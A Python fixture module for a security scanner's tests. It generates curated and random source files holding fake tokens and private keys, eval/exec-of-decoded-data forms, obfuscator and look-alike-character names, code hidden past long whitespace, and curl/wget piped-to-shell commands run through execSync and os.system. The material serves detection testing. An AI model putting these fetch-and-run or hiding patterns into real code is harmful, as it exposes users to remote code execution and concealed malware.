"""The scan_file corpus: source files for test_snapshot_scanfile.py, which
holds the engine's scan_file (dependency mode), scan_rules and file_context
to their recorded outputs, and for test_wasm_parity_signs.py, which holds
the WebAssembly build to the native library; and real_files(), this
repository's sources, its fixtures and a sample of Python's standard
library, for the comparisons that need no fixed inputs (WebAssembly and
native on the same machine).

Curated files for each family of findings (CURATED), then a seeded random
stream of files built from the pieces each family looks at, lines of them
joined with every line ending: pattern rules and their multi-line joins,
private-key headers with and without key material, JWTs, hex and name
escapes, look-alike and invisible characters, char codes, base64 blobs,
off-screen code, high-entropy literals, obfuscator names, self-publishing,
decode flows, comments and literals of each language, and the Unicode the
match text normalizes; go_rs_corpus(), the same for Go and Rust files. Not
a test: a plain module of shared data.

Credentials here are fakes built by concatenation (a whole literal would
trip secret scanners, GitHub's push protection among them).
"""
import os
import random

from tests import _support
from tests.architecture import hooks_corpus

AWS = "AKIA" + "ABCDEFGHIJKLMNOP"
GHP = "gh" + "p_" + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789"
SLACK = "xo" + "xb-" + "1234567890-abcdefghij"
STRIPE = "sk_" + "live_" + "aBcDeFgHiJkLmNoP1234"
GOOGLE = "AI" + "za" + "SyA1bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1v"
JWT = "ey" + "JhbGciOiJIUzI1NiJ9." + "ey" + "JzdWIiOiIxMjM0NTY3ODkwIn0.c2ln"
PEM_BEGIN = "-----BEGIN RSA " + "PRIVATE KEY-----"
PEM_END = "-----END RSA " + "PRIVATE KEY-----"
PEM_BODY = "MIIEow" + "IBAAKCAQEAx3k9Qm2Zp7Lw4Yb8Nc1Rt5Vs6Ug0Hj2Kd3Fe4" + "Ab" * 8
ENTROPY = ["Zx8Qw3Er5Ty7Ui9Op1As2Df", "q9W2e8R3t7Y4u6I5o0P1a2S3d4F5g6H7", "Ab3+De5/Gh7=Jk9Lm1No3Pq5",
           "4f8a1c9e2b7d3a6f0c5e8b2d9a7f1c3e", "hunter2hunter2"]
# base64 data: 220 characters of a run that is no single class and no short period, which SC-B64 reports (G-5
# passes over "QUJD" * 55, a period of four letters, which this was)
B64 = __import__("base64").b64encode(bytes((i * 7919) % 256 for i in range(165))).decode()
# runs of base64 characters that are not base64 data (G-5): hex, hex after 0x, a name table, digits, a short period
PLAIN = ["fd0c71ecb7ed16a9" * 14, "0x" + "E0A67598CD1B763B" * 13, "SundayMondayTuesdayWednesdayThursdayFriday" * 5,
         "1336927655" * 22, "01234567890ABCDEFGHIJK" * 10]
LONG_PAD = "x" * 150


def _hex(s):
    return "".join(f"\\x{ord(c):02x}" for c in s)


CURATED = [
    # pattern rules
    ("secrets.py", f"password = 'hunter22hunter'\napi_key = \"{ENTROPY[0]}\"\nsecret = os.environ['S']\n"
                   "pwd = 'example-value'\nconfig['secret'] = 'x1y2z3w4'\n"),
    ("secrets.js", f"const auth_token = '{ENTROPY[1]}';\nlet accessKey = \"{ENTROPY[2]}\";\n"
                   "const privateKey = process.env.KEY;\n// password: 'in a comment'\n"),
    ("tokens.py", f"AWS = '{AWS}'\nGH = '{GHP}'\n# {SLACK}\nSTRIPE = \"{STRIPE}\"\nG = '{GOOGLE}'\nT = '{JWT}'\n"),
    ("tokens.js", f"// a key follows\nconst k = `{PEM_BEGIN}\n{PEM_BODY}\n{PEM_BODY}\n{PEM_END}`;\n"
                  f"const header = '{PEM_BEGIN}';\nmodule.exports = {{ header }};\n"),
    ("header-only.py", f"KEY_HEADER = '{PEM_BEGIN}'\nKEY_FOOTER = '{PEM_END}'\n\n\ndef is_key(t):\n"
                       "    return t.startswith(KEY_HEADER)\n"),
    ("jwt-run.js", "//" + "eyJ" * 3000 + "\nconst t = '" + JWT + "';\n"),
    ("eval.js", "eval(atob('ZXZhbCgxKQ=='));\nconst f = new Function(atob(p));\n(0, eval)(atob(p));\n"
                "window['eval'](atob(p));\neval.call(null, atob(p));\nglobalThis['ev' + 'al'](atob(p));\n"),
    ("eval-join.js", "eval(\n  atob(\n    payload\n  )\n);\nexecSync(\n  Buffer.from(x, 'base64').toString()\n);\n"),
    ("eval-join.py", "import base64\nexec(  # nosec\n    base64.b64decode(\n        DATA))\n"
                     "exec\n(base64.b64decode(x))\neval(\n    compile(base64.b64decode(x), 'f', 'exec'))\n"),
    ("packer.js", "eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0 1',2,2,'a|b'.split('|'),0,{}))\n"),
    ("decoder.js", "eval((function(x){return x.map(function(c){return String.fromCharCode(c)}).join('')})(["
                   + ",".join(str(100 + i % 20) for i in range(210)) + "]))\n"),
    ("marshal.py", "import marshal, zlib\nexec(marshal.loads(b'\\xe3\\x00\\x00'))\n"
                   "code = marshal.loads(zlib.decompress(blob))\nf = marshal.load(open('x.pyc', 'rb'))\n"),
    # (project mode) a download handed to a shell by an exec call, and help text that only shows one
    ("pipe-shell.js", "const { execSync } = require('child_process');\n"
                      "execSync('curl -fsSL https://files.invalid/i.sh | sh');\n"
                      "execSync(`bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"`);\n"
                      "console.log('install with: curl -fsSL https://files.invalid/i.sh | sh');\n"
                      "// execSync('curl https://files.invalid/x | bash')\n"),
    ("pipe-shell.py", "import os, subprocess\nos.system('wget -qO- https://files.invalid/i.sh | bash')\n"
                      "subprocess.run('curl -s https://files.invalid/x | sudo sh', shell=True)\n"
                      "print('curl https://files.invalid/x | sh')\n"),
    # hex text and names
    ("hex.js", f"var a = \"{_hex('eval(atob(payload))')}\";\nvar b = \"{_hex('hello world, all readable')}\";\n"
               "var c = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\";\n"),
    ("hexname.js", "global[\"\\x72\\x65\\x71\\x75\\x69\\x72\\x65\"](\"child_process\");\nconst e = \"\\x65val\";\n"
                   "const u = '\\u0065val';\nconst v = \"\\u{65}xec\";\nconst o = '\\145val';\nconst s = '\\\\x65val';\n"
                   "const url = \"https:\\u002F\\u002Fexample.invalid\";\n"),
    ("hexname.py", "getattr(__builtins__, '\\x65\\x78\\x65\\x63')(src)\nname = '\\U00000065val'\n"),
    # look-alike names
    ("lookalike.js", "const \u0435val = eval;\n\u0435val(x);\nfunction isAdm\u0456n(u) { return u.admin; }\n"
                     "const \uff45val = 1;\nconst ev\u200dal = eval;\nconst \u043f\u0440\u0438\u0432\u0435\u0442 = 1;\n"
                     "const s = '\u0435val';\n// \u0435val in a comment\nconst r = /http[s\u017f]?/;\n"),
    ("lookalike.py", "\u0435xec = exec\n\u0435xec(code)\n\uff45\uff58\uff45\uff43(code)\n"
                     "def is_adm\u0456n(u):\n    return u.admin\n\u043f\u0440\u0438\u0432\u0435\u0442 = 'hi'\n"),
    ("other-name.js", "function loadConfig() {}\nconst loadC\u043enfig = () => fetch(u);\nloadC\u043enfig();\n"),
    # invisible runs
    ("hidden.js", "const p = '\ufe00\ufe01\ufe02\ufe03';\neval(decode(p));\n"),
    ("hidden.py", "s = '\U000e0041\U000e0042\U000e0043'\nflag = '\U0001f3f4\U000e0067\U000e0062\U000e0065\U000e006e"
                  "\U000e0067\U000e007f'\nok = '\u2764\ufe0f'\nmixed = '\ufe0e\U000e0020'\n"),
    # char codes, base64, off-screen code
    ("charcode.js", "var s = String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100);\n"
                    "var t = [104,101,108,108,111,32,119,111,114,108,100]; String.fromCharCode.apply(null, t);\n"
                    "String.fromCharCode(...bytes);\n"),
    ("b64.js", f"const blob = \"{B64}\";\n//# sourceMappingURL=data:application/json;base64,\"{B64}\"\n"),
    ("b64.py", f"BLOB = '{B64}'\n"),
    ("b64_plain.js", "".join(f"const p{i} = \"{run}\";\n" for i, run in enumerate(PLAIN))
                     + f"const both = [\"{PLAIN[2]}\", \"{B64}\"];\n"),
    ("offscreen.js", "module.exports = 1;" + " " * 200 + "require('child_process').exec(atob(p));\n"
                     "const s = 'x" + " " * 200 + "y';\n"),
    ("offscreen.py", "import os" + " " * 180 + ";os.system('id')\nx = 1" + "\t" * 170 + "; print(x)\n"),
    # entropy, with the skip words, and context lines to redact
    ("entropy.py", f"TOKEN = '{ENTROPY[3]}'\nEXAMPLE = '{ENTROPY[3]}'  # example\nkey: '{ENTROPY[0]}'\n"
                   f"url = '/a/b/{ENTROPY[1]}'\nplain = 'abcdefghijklmnopqrstuvwxyz'\n"
                   f"os.system(cmd)  # near '{ENTROPY[2]}'\n"),
    ("redact.js", f"const a = 1;\nconst key = '{AWS}';\neval(atob(p));\nconst pw = \"password\";\n"
                  f"const url = 'https://user:{ENTROPY[4]}@host.invalid/';\n{PEM_BEGIN}\n{PEM_BODY}\n"),
    # obfuscator names, self-publishing
    ("obf.js", "var _0x1a2b=['a'],_0x3c4d=1,_0x5e6f=2;function _0x7a8b(){}var _0x9c0d=_0x1a2b;x_0xabcd;\n"),
    # decode flows
    ("flow.js", "const cp = require('child_process');\nconst d = atob(p);\nconst e = d + '';\n\n"
                "cp.exec(e);\nre.exec(t);\nfunction exec(a) {}\nclass A { exec(a, b) { return a } }\n"
                "window.eval(Buffer.from(q, 'base64').toString());\n"),
    ("flow.py", "from base64 import b64decode as invoke, b64encode as enc\nimport zlib\n"
                "payload = invoke('aW1wb3J0IG9z')\ncode = payload\nexec(code)\n"
                "data = zlib.decompress(blob)\nbuiltins.exec(data)\n"),
    ("flow-far.js", "const d = atob(p);\n" + ("// filler " + "y" * 60 + "\n") * 200 + "eval(d);\n"),
    # match text: NFKC for Python, identifier escapes and U+FEFF for JavaScript
    ("nfkc.py", "\uff45\uff56\uff41\uff4c(\uff42\uff41\uff53\uff45\uff16\uff14.b64decode(x))\n"
                "caf\u00e9 = '\u00e9'\n\ufb01le = 1\n"),
    ("uesc.js", "\\u0065val(atob(p));\nconst s = '\\u0065val(atob(p))';\neval\ufeff(atob(p));\n"
                "\\u{65}val(atob(q));\nx\\u200cy = 1;\n"),
    ("lines-crlf.js", "eval(atob(p));\r\nconst k = '" + AWS + "';\r\n/* a\r\n   comment */\r\n"),
    ("lines-cr.py", "exec(b64decode(x))\rT = '" + JWT + "'\r"),
    ("lines-ls.js", "a = 1;\u2028eval(atob(p));\u2029const q = '" + GHP + "';\n"),
    ("comments.js", "/*\n eval(atob(p));\n*/\n// eval(atob(q))\nconst t = `${eval(atob(r))}`;\n"
                    "const re = /eval\\(atob/;\nconst el = <div>eval(atob(s))</div>;\n"),
    ("comments.ts", "const x = <T>(y: T) => y;\n// " + AWS + "\n/* " + GHP + " */\n"),
    ("comments.py", "# eval(atob(p))\n'''\nexec(b64decode(x))\n'''\nf\"{exec(b64decode(y))}\"\n"),
    ("query.sql", f"-- {AWS}\nSELECT '{ENTROPY[3]}' AS k; -- \"{B64}\"\n/* {_hex('eval(atob(p))')} */\n"),
    ("long.js", "const a = [" + ", ".join(str(i) for i in range(120)) + "]; eval(atob(p)); const k = '" + AWS + "';\n"),
]


# pieces each family looks at, for the random stream
CODE = ["eval(", "exec(", "execSync(", "Function(", "new Function(", "atob(", "b64decode(", "base64.b64decode(",
        "Buffer.from(", ", 'base64')", "bytes.fromhex(", "zlib.decompress(", "codecs.decode(", "marshal.loads(",
        ")", ")", "(", ";", " ", " ", "  ", "\t", "=", " = ", "d", "e", "p", "x", "const d = ", "let e = ", "var ",
        "cp.exec(", "window.eval(", "require('child_process')", "(0, eval)(", "eval.call(null, ", "re.exec(",
        "function exec(", "exec(a, b) {", ".decrypt(", "from base64 import b64decode as bd\n", "bd(", "import os\n",
        "globalThis['ev' + 'al'](", "Reflect.apply(eval, null, [", "runInNewContext(", "vm.runInThisContext("]
TEXT = ["'", '"', "`", "\\", "\\x65", "\\x76", "\\x61\\x6c", "\\x72\\x65\\x71\\x75\\x69\\x72\\x65", "\\u0065", "\\u{65}",
        "\\145", "\\\\x65", "\\U00000065", "\\x00", "\\xff", _hex("eval(atob"), _hex("hello"), "hello", "val", "xec",
        "http", "://", "curl", "require", "child_process"]
UNI = ["\u0435", "\u0430", "\u043e", "\u0456", "\u0391", "\u03bf", "\uff45", "\uff58", "\u200c", "\u200d", "\u00e9",
       "e\u0301", "\ufb01", "\u00a0", "\u212a", "\ufeff", "\u2028", "\u0585", "\u0251", "\U0001d41e", "\u0661",
       "\ufe00", "\ufe01", "\ufe0f", "\U000e0041", "\U000e007f", "\U0001f3f4", "\u202e", "\ud800", "\U000e01ef"]
SECRET = [AWS, GHP, SLACK, STRIPE, GOOGLE, JWT, PEM_BEGIN, PEM_END, PEM_BODY, "eyJ", "eyJeyJ", ".eyJ" + "a" * 12,
          "password = ", "secret: ", "api_key=", "pwd:", "'hunter2hunter'", "example", "process.env", "getenv",
          "mock", "{{", "config[", "import"] + ["'" + e + "'" for e in ENTROPY] + ENTROPY + [
          "k = '" + e + "'" for e in ENTROPY] + ["key: \"" + e + "\"" for e in ENTROPY]
BLOB = [B64, "'" + B64 + "'", "\"" + B64 + "==\"", "sourceMappingURL", "String.fromCharCode(",
        "104,101,108,108,111,32,119,111,114,108,100", "[104,101,108,108,111,32,119,111,114,108,100]", ".apply(null, t)",
        " " * 160, "\t" * 160, "_0x1a2b", "_0x3c4d", "_0x5e6f", "_0x7a8b", "_0x9c0d", "_0xabcdef",
        "var _0x1a2b=_0x3c4d(_0x5e6f,_0x7a8b)+_0x9c0d;", "eval(function(p,a,c,k,e,d){", "}('0',1,1,'a'.split('|')))"]
STRUCTURE = ["\n", "\n", "\n", "\r\n", "\r", "// ", "# ", "/* ", " */", "-- ", "'''", '"""', "${", "}", "/re/", "<div>",
             "</div>", "{", "}", "[", "]", ",", ".", "=>", "#!", "f'", "b'", "r'"]
PATHS = [("x.js", 5), ("x.py", 5), ("x.ts", 1), ("x.jsx", 1), ("x.mjs", 1), ("x.sql", 1)]


def _path(rnd):
    names = [p for p, w in PATHS for _ in range(w)]
    return rnd.choice(names)


def corpus(seed=20260930, scale=1):
    """(path, text) cases: CURATED (each as JavaScript and as Python too),
    the hooks corpus' curated scripts as files, then random files."""
    rnd = random.Random(seed)
    cases = []
    for name, text in CURATED:
        cases.append((name, text))
        other = "again.py" if name.endswith((".js", ".ts", ".sql")) else "again.js"
        cases.append((other, text))
    hooks = (hooks_corpus.SIGN_CURATED + hooks_corpus.SELF_CURATED + hooks_corpus.PUBLISH_CURATED
             + hooks_corpus.DECODED_CURATED + hooks_corpus.EXFIL_CURATED + hooks_corpus.XOR_CURATED)
    for k, text in enumerate(hooks):
        cases.append(("hook.js" if k % 2 else "hook.py", text))
    alphabets = [CODE, TEXT, UNI, SECRET, BLOB, STRUCTURE]
    for _ in range(4000 * scale):
        pieces = rnd.choice([CODE + TEXT + STRUCTURE, CODE + SECRET + STRUCTURE, TEXT + UNI + STRUCTURE,
                             BLOB + CODE + STRUCTURE, sum(alphabets, [])])
        lines = rnd.randint(1, 12)
        text = "".join("".join(rnd.choice(pieces) for _ in range(rnd.randint(0, 10))) + rnd.choice(["\n", "\n", "\r\n", "\r"])
                       for _ in range(lines))
        cases.append((_path(rnd), text))
    return cases


# Go and Rust (S-4: a project's .go and .rs files): the rules that list the
# two languages (S-SECRET, S-TOKEN, S-BIDI, Q-TODO), the families every text
# gets, and what each language's lexer makes a comment or a literal
RLO = "\u202e"
GO_RS_CURATED = [
    ("secrets.go", f"package main\n\nimport \"os\"\n\nvar password = \"hunter22hunter\"\n"
                   f"const apiKey = \"{ENTROPY[0]}\"\npw := os.Getenv(\"PASSWORD\")\n"
                   "// password = \"in a comment\"\nsecret := \"colon-equals\"\n"
                   "cfg := Config{Password: \"hunter22hunter\", APIKey: \"example\"}\n"),
    ("secrets.rs", "let password = \"hunter22hunter\";\npub const API_KEY: &str = \"typed-constant\";\n"
                   "/* outer /* nested */ let password = \"in a comment\"; */\n"
                   "let pw = std::env::var(\"PASSWORD\");\n/// password = \"in a doc comment\"\n"
                   f"let secret = \"{ENTROPY[1]}\";\n"),
    ("tokens.go", f"var aws = \"{AWS}\"\n// {GHP}\nvar k = `{PEM_BEGIN}\n{PEM_BODY}\n{PEM_END}`\n"
                  f"var header = \"{PEM_BEGIN}\"\nvar jwt = \"{JWT}\"\nr := '\"'; s := \"{SLACK}\"\n"),
    ("tokens.rs", f"let raw = r#\"{AWS}\"#;\nlet b = b\"{GHP}\";\n// {STRIPE}\n"
                  f"const K: &str = \"{PEM_BEGIN}\n{PEM_BODY}\n{PEM_END}\";\n"
                  f"fn f<'a>(x: &'a str) -> &'a str {{ x }} // {GOOGLE}\nlet c = 'x'; let t = \"{JWT}\";\n"
                  f"let r = r##\"a \"# {AWS}\"##;\n/* outer /* {GHP} */ still */\n"),
    ("bidi.go", f"s := \"user{RLO}nimda\"\nt := \"\\u202e\"\n// {RLO} in a comment\n"),
    ("bidi.rs", f"let s = \"user{RLO}nimda\";\nlet t = \"\\u{{202e}}\";\n/* {RLO} */\n"),
    ("hidden.go", "p := \"\ufe00\ufe01\ufe02\ufe03\"\nexec.Command(decode(p)).Run()\n"),
    ("hidden.rs", "let s = \"\U000e0041\U000e0042\U000e0043\";\nlet ok = \"\u2764\ufe0f\";\n"),
    ("hex.go", f"var a = \"{_hex('eval(atob(payload))')}\"\nvar b = \"{_hex('hello world, all readable')}\"\n"),
    ("hex.rs", f"let a = \"{_hex('hello world, all readable')}\";\nlet n = \"\\x65\\x76al\";\n"),
    ("b64.go", f"var blob = \"{B64}\"\nvar raw = `{B64}`\n"),
    ("b64.rs", f"const BLOB: &str = \"{B64}\";\nlet raw = r\"{B64}\";\n"),
    ("b64_plain.go", "".join(f"var p{i} = \"{run}\"\n" for i, run in enumerate(PLAIN))
                     + f"var both = []string{{\"{PLAIN[0]}\", \"{B64}\"}}\n"),
    ("markers.go", f"var a = \"{AWS}\" // lazaret-ignore: S-TOKEN\n// nosec\nvar b = \"{GHP}\"\n"
                   f"var c = \"// nosec\"; var d = \"{AWS}\"\n/* lazaret-ignore */ var e = \"{AWS}\"\n"),
    ("markers.rs", f"let a = \"{AWS}\"; // lazaret-ignore: S-TOKEN\n/// nosec\nlet b = \"{GHP}\";\n"
                   f"let c = \"// nosec\"; let d = \"{AWS}\";\n"),
    ("todo.go", "// TODO: rotate\nvar s = \"FIXME in a string\"\n/* XXX\n   HACK */\n"),
    ("todo.rs", "//! FIXME: docs\nlet s = \"TODO\";\n/*\n * HACK\n */\n"),
    ("long.go", "var table = []int{" + ", ".join(str(i) for i in range(120)) + f"}} // {AWS}\n"),
    ("long.rs", "const T: [u8; 120] = [" + ", ".join(str(i % 250) for i in range(120)) + "];\n"),
    ("crlf.go", f"var a = \"{AWS}\"\r\n/* a\r\n comment */\r\nvar password = \"hunter22hunter\"\r\n"),
    ("cr.rs", f"let t = \"{JWT}\";\r// {GHP}\rlet password = \"hunter22hunter\";\r"),
    ("shebang.rs", f"#!/usr/bin/env rust-script\n#![allow(unused)]\nfn main() {{ let k = \"{AWS}\"; }}\n"),
    ("quotes.go", f"s := \"*/\"; /* \"{AWS}\" */\nr := '`'; t := `\"{GHP}\"`\n"),
    ("unclosed.go", f"var a = \"{AWS}\nvar b = `{GHP}\n"),
    ("unclosed.rs", f"let a = \"{AWS}\n/* {GHP}\n"),
]
# pieces of Go and Rust, for their random stream
GO_RS_CODE = ["func ", "fn ", "let ", "let mut ", "var ", "const ", "pub ", "impl ", "struct ", "type ", " := ", " = ",
              "{", "}", "(", ")", ";", ", ", "&'a ", "'a", "'x'", "b'x'", "'\\''", "'\\n'", "r#\"", "\"#", "r##\"",
              "\"##", "`", "r\"", "b\"", "c\"", "#[derive(Debug)]", "#![allow(x)]", "go func() {", "defer ",
              "os.Getenv(", "std::env::var(", "unsafe {", "println!(", "fmt.Println(", "exec.Command(", "x", "y", " "]
GO_RS_STRUCTURE = ["\n", "\n", "\n", "\r\n", "\r", "// ", "/* ", " */", "/// ", "//! ", "/** ", "\"", "\\\"",
                   "\\\\", "\\x65", "\\u{202e}", "\\u202e", "#!"]
GO_RS_PATHS = [("x.go", 1), ("x.rs", 1)]


def go_rs_corpus(seed=20261004, scale=1):
    """(path, text) cases for Go and Rust: GO_RS_CURATED (each in the other
    language too), then random files of their pieces and the families'."""
    rnd = random.Random(seed)
    cases = []
    for name, text in GO_RS_CURATED:
        cases.append((name, text))
        cases.append(("again.rs" if name.endswith(".go") else "again.go", text))
    for _ in range(1500 * scale):
        pieces = rnd.choice([GO_RS_CODE + SECRET + GO_RS_STRUCTURE, GO_RS_CODE + TEXT + UNI + GO_RS_STRUCTURE,
                             BLOB + GO_RS_CODE + GO_RS_STRUCTURE, GO_RS_CODE + SECRET + UNI + BLOB + GO_RS_STRUCTURE])
        lines = rnd.randint(1, 12)
        text = "".join("".join(rnd.choice(pieces) for _ in range(rnd.randint(0, 10))) + rnd.choice(["\n", "\n", "\r\n", "\r"])
                       for _ in range(lines))
        cases.append((rnd.choice([p for p, w in GO_RS_PATHS for _ in range(w)]), text))
    return cases


MAX_REAL = 300_000                     # characters of a real file read
_LANGS = {".py": "py", ".pyw": "py", ".js": "js", ".jsx": "js", ".ts": "js", ".tsx": "js", ".mts": "js",
          ".cts": "js", ".mjs": "js", ".cjs": "js", ".sql": "sql"}


def lang_of(path):
    return _LANGS.get(os.path.splitext(path)[1].lower())


def real_files():
    """(path, text): this repository's Python and JavaScript sources and
    fixtures, and every 12th module of the standard library."""
    out = []
    roots = [os.path.join(_support.PY_ROOT, "src"), os.path.join(_support.REPO_ROOT, "js", "src"),
             os.path.join(_support.PY_ROOT, "tests", "fixtures")]
    stdlib = []
    for root, _dirs, files in os.walk(os.path.dirname(os.__file__)):
        if "site-packages" in root or "dist-packages" in root:
            continue
        stdlib += [os.path.join(root, f) for f in files if f.endswith(".py")]
    paths = []
    for base in roots:
        for root, _dirs, files in os.walk(base):
            paths += [os.path.join(root, f) for f in sorted(files) if lang_of(f)]
    paths += sorted(stdlib)[::12]
    for p in paths:
        try:
            with open(p, encoding="utf-8", errors="replace") as f:
                text = f.read()
        except OSError:
            continue
        if len(text) <= MAX_REAL:
            out.append((os.path.relpath(p, _support.REPO_ROOT) if p.startswith(_support.REPO_ROOT) else p, text))
    return out
